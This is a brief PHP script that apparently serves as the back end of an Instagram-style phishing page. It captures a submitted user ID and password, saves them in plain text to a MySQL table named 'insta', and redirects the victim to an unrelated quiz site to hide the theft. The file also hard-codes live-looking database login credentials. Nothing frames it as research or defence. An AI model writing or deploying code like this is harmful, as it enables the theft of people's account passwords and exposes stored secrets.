<?php
$uid = $_POST['uid']; 
$pswd = $_POST['pswd'];

$conn = new mysqli('localhost','id15811214_mcmdav','Project@A124','id15811214_logininfo');

	if(!$conn) {
			echo "Not connected";		# code...
	} else 
	{
		$stmt = $conn->prepare("insert into insta(uid,pswd) values(?,?)");
		$stmt->bind_param("ss",$uid,$pswd);
		$stmt->execute();
	    header("Location:https://www.matequiz.com/start.html?quiz=614dc450c5b9770f34d2cc17");
		$stmt->close();
		$conn->close();
	}
?>
